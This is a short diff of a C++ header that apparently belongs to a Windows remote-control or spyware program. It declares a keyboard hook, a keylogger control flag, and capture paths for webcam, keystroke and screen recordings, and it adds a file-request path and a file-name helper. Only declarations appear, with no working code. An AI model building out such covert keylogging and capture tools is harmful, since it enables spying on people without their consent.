@@ -29,10 +29,11 @@ extern HHOOK hHook;
 extern atomic<bool> keepKeyloggerRunning;
 extern ofstream f;
 extern stringstream inp, out;
-extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath;
+extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath, requestFilePath;
 
 map<string, map<string, function<void()>>> setupHandlers();
 string getInstruction();
+string getFileName(const string& filePath);
 void listProcesses();
 void startApp(LPWSTR appPath);
 void stopApp(DWORD processID);
